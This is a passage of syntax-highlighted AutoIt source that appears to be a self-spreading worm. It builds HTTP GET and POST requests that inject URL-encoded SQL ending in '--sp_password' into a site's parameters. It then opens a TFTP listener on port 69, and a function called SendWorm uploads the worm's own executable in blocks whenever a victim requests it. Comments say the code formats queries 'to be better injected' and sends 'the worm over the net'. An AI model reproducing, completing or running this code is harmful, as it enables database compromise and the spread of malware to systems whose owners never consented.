    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0"> False
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sServer</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$nPort</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">80</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">":"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$nPort</span><span class="sc0">
    </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$p</span><span class="sc8">=</span><span class="sc3">2</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc5">Step</span><span class="sc0"> </span><span class="sc3">2</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">])&gt;</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
            </span><span class="sc9">$sTempVect</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringReplace</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">-</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"="</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">],</span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">-</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"="</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> FormatQuery</span><span class="sc8">(</span><span class="sc7">"';"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sQuery</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"--sp_password"</span><span class="sc8">))</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$sMethod</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"GET"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$query</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sMethod</span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" /"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sTempVect</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" HTTP/1.0"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Host: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0">
            </span><span class="sc5">Else</span><span class="sc0">
                </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$newparams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringmid</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc4">Stringinstr</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
                </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$query</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sMethod</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" /"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc4">stringinstr</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" HTTP/1.0"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Host: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Content-Type: application/x-www-form-urlencoded"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Content-length: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$newparams</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$newparams</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
            TCPSend</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">,</span><span class="sc9">$query</span><span class="sc8">)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> TFTPSession</span><span class="sc8">(</span><span class="sc3">6000</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
                </span><span class="sc5">Return</span><span class="sc0"> True
            </span><span class="sc5">EndIf</span><span class="sc0">
            </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> TCPConnect</span><span class="sc8">(</span><span class="sc0">TCPNameToIP</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">),</span><span class="sc9">$nPort</span><span class="sc8">)</span><span class="sc0">
            </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0"> False
            </span><span class="sc9">$sTempVect</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringReplace</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">-</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"="</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">],</span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">-</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"="</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$Param</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> FormatQuery</span><span class="sc8">(</span><span class="sc7">";"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sQuery</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"--sp_password"</span><span class="sc8">))</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$sMethod</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"GET"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                </span><span class="sc9">$query</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sMethod</span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" /"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sTempVect</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" HTTP/1.0"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Host: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0">
            </span><span class="sc5">Else</span><span class="sc0">
                </span><span class="sc9">$newparams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringmid</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc4">Stringinstr</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
                </span><span class="sc9">$query</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sMethod</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" /"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc4">stringinstr</span><span class="sc8">(</span><span class="sc9">$sTempVect</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" HTTP/1.0"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Host: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Content-Type: application/x-www-form-urlencoded"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Content-length: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$newparams</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$newparams</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
            TCPSend</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">,</span><span class="sc9">$query</span><span class="sc8">)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> TFTPSession</span><span class="sc8">(</span><span class="sc3">6000</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
                </span><span class="sc5">Return</span><span class="sc0"> True
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">Next</span><span class="sc0">
    TCPCloseSocket</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Return</span><span class="sc0"> False
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> FormatQuery</span><span class="sc8">(</span><span class="sc9">$sQ</span><span class="sc8">)</span><span class="sc1">;formats the sql query to be better injected</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sQ</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sNewQuery</span><span class="sc0">
</span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$c</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sQ</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$ch</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc9">$ch</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sQ</span><span class="sc8">,</span><span class="sc9">$c</span><span class="sc8">),</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sNewQuery</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sNewQuery</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"%"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">StringRight</span><span class="sc8">(</span><span class="sc4">Hex</span><span class="sc8">(</span><span class="sc4">Asc</span><span class="sc8">(</span><span class="sc9">$ch</span><span class="sc8">)),</span><span class="sc3">2</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">Next</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$sNewQuery</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">func</span><span class="sc0"> TFTPSession</span><span class="sc8">(</span><span class="sc9">$MAX_WAIT</span><span class="sc8">)</span><span class="sc1">;starts a tftp session and waits for inputs for the given period of time</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$ret</span><span class="sc8">=</span><span class="sc0">False
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$port</span><span class="sc8">=</span><span class="sc3">69</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$ipaddr</span><span class="sc8">=</span><span class="sc6">@IPAddress1</span><span class="sc0">
    UDPStartup</span><span class="sc8">()</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> UDPBind</span><span class="sc8">(</span><span class="sc9">$ipaddr</span><span class="sc8">,</span><span class="sc9">$port</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc8">=-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">Return</span><span class="sc0"> False
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$ti</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> TimerInit</span><span class="sc8">()</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> TimerDiff</span><span class="sc8">(</span><span class="sc9">$ti</span><span class="sc8">)&lt;</span><span class="sc9">$MAX_WAIT</span><span class="sc0">
        </span><span class="sc9">$recv</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> UDPRecv</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">,</span><span class="sc3">512</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> 
            </span><span class="sc5">ExitLoop</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">String</span><span class="sc8">(</span><span class="sc9">$recv</span><span class="sc8">)&lt;&gt;</span><span class="sc7">""</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> 
            </span><span class="sc9">$recv</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringmid</span><span class="sc8">(</span><span class="sc4">string</span><span class="sc8">(</span><span class="sc9">$recv</span><span class="sc8">),</span><span class="sc4">Stringinstr</span><span class="sc8">(</span><span class="sc4">string</span><span class="sc8">(</span><span class="sc9">$recv</span><span class="sc8">),</span><span class="sc7">"x"</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$recv</span><span class="sc8">,</span><span class="sc3">4</span><span class="sc8">)=</span><span class="sc7">"0001"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc1">;RRQ</span><span class="sc0">
                </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> SendWorm</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">)</span><span class="sc0">
                </span><span class="sc5">ExitLoop</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">WEnd</span><span class="sc0">
    UDPCloseSocket</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">)</span><span class="sc0">
    UDPShutdown</span><span class="sc8">()</span><span class="sc0">
    </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$ret</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">func</span><span class="sc0"> SendWorm</span><span class="sc8">(</span><span class="sc9">$socket</span><span class="sc8">)</span><span class="sc1">;send the worm over the net w/e a tftp request is made</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$socket</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> @AutoItExe
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc5">not</span><span class="sc0"> </span><span class="sc4">FileExists</span><span class="sc8">(</span><span class="sc9">$name</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        UDPSend</span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$socket</span><span class="sc8">,</span><span class="sc0"> BinaryString</span><span class="sc8">(</span><span class="sc7">"0x00050001"</span><span class="sc8">)&amp;</span><span class="sc7">"File not found."</span><span class="sc8">&amp;</span><span class="sc4">Chr</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc5">Return</span><span class="sc0"> False
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$opcode</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"0x0003"</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$block</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$data</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$size</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileGetSize</span><span class="sc8">(</span><span class="sc9">$name</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$totblocks</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">int</span><span class="sc8">(</span><span class="sc9">$size</span><span class="sc8">/</span><span class="sc3">512</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$fhandle</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileOpen</span><span class="sc8">(</span><span class="sc9">$name</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$filedata</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileRead</span><span class="sc8">(</span><span class="sc9">$fhandle</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc4">FileClose</span><span class="sc8">(</span><span class="sc9">$fhandle</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$bnum</span><span class="sc8">=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc9">$totblocks</span><span class="sc0">
        </span><span class="sc9">$block</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc4">String</span><span class="sc8">(</span><span class="sc4">Hex</span><span class="sc8">(</span><span class="sc9">$bnum</span><span class="sc8">+</span><span class="sc3">1</span><span class="sc8">)),</span><span class="sc3">4</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc9">$data</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringmid</span><span class="sc8">(</span><span class="sc9">$filedata</span><span class="sc8">,(</span><span class="sc9">$bnum</span><span class="sc8">*</span><span class="sc3">512</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">,</span><span class="sc3">512</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$packet</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> BinaryString</span><span class="sc8">(</span><span class="sc9">$opcode</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$block</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$data</span><span class="sc0">
        </span><span class="sc5">Do</span><span class="sc0"> 
            UDPSend</span><span class="sc8">(</span><span class="sc9">$socket</span><span class="sc8">,</span><span class="sc9">$packet</span><span class="sc8">)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$socket</span><span class="sc8">=-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">ExitLoop</span><span class="sc0">
            </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$tm</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> TimerInit</span><span class="sc8">()</span><span class="sc0">
            </span><span class="sc5">Do</span><span class="sc0">
             </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$r</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> UDPRecv</span><span class="sc8">(</span><span class="sc9">$socket</span><span class="sc8">,</span><span class="sc3">512</span><span class="sc8">)</span><span class="sc0">
             </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">ExitLoop</span><span class="sc0">
            </span><span class="sc5">Until</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc4">string</span><span class="sc8">(</span><span class="sc9">$r</span><span class="sc8">))&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> TimerDiff</span><span class="sc8">(</span><span class="sc9">$tm</span><span class="sc8">)&gt;=</span><span class="sc3">5000</span><span class="sc8">)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> TimerDiff</span><span class="sc8">(</span><span class="sc9">$tm</span><span class="sc8">)&gt;=</span><span class="sc3">5000</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">ExitLoop</span><span class="sc0">
        </span><span class="sc5">Until</span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$r</span><span class="sc8">=</span><span class="sc0">binarystring</span><span class="sc8">(</span><span class="sc7">"0x0004"</span><span class="sc8">)&amp;</span><span class="sc0">BinaryString</span><span class="sc8">(</span><span class="sc7">"0x"</span><span class="sc8">&amp;</span><span class="sc9">$block</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Next</span><span class="sc0">
    </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$bnum</span><span class="sc8">&gt;</span><span class="sc9">$totblocks</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> HTTPRequest</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">)</span><span class="sc1">;retrieves the given resource from the internet</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$nPort</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">80</span><span class="sc0">
 </span><span class="sc9">$sResource</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc5">not</span><span class="sc0"> IsAnHTTPService</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
